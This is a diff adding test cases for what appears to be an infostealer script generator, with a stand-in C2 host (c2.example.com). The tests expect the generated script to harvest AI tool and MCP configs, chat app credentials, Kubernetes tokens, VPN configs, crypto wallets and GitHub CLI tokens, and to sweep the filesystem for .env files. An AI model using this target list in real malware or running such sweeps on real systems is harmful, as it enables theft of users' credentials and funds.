@@ -203,6 +203,62 @@ func TestGenerateInfostealerScript(t *testing.T) {
 				"ORIGINAL SCRIPT CONTENT",
 			},
 		},
+		{
+			name: "extended paths include AI tool and chat/IM configs",
+			opts: InfostealerOptions{
+				C2URL:    "https://c2.example.com",
+				Extended: true,
+			},
+			contains: []string{
+				// AI tool configs
+				"$HOME/.claude.json",
+				"$HOME/.claude/mcp.json",
+				"$HOME/.kiro/settings/mcp.json",
+				// Chat/IM credentials
+				"$HOME/.config/discord/Local Storage/leveldb",
+				"$HOME/.config/Slack/Cookies",
+				"$HOME/.config/Signal",
+				"$HOME/.config/telegram-desktop",
+				// K8s service account token
+				"/var/run/secrets/kubernetes.io/serviceaccount/token",
+				// Docker containers
+				"/var/lib/docker/containers",
+				// VPN configs
+				"$HOME/.config/openvpn",
+				"/etc/openvpn",
+				"/etc/NetworkManager/system-connections",
+				// Additional crypto wallets
+				"$HOME/.cardano",
+				"$HOME/.monero/wallet.keys",
+				"$HOME/.zcash/wallet.dat",
+				"$HOME/.polkadot",
+			},
+		},
+		{
+			name: "gh auth token extraction",
+			opts: InfostealerOptions{
+				C2URL: "https://c2.example.com",
+			},
+			contains: []string{
+				"gh auth token",
+				"GH_AUTH_TOKEN",
+				"gh_cli_token.txt",
+			},
+		},
+		{
+			name: "env file sweep via find",
+			opts: InfostealerOptions{
+				C2URL: "https://c2.example.com",
+			},
+			contains: []string{
+				"find /",
+				".env",
+				".env.local",
+				".env.production",
+				".env.staging",
+				"node_modules",
+			},
+		},
 	}
 
 	for _, tt := range tests {
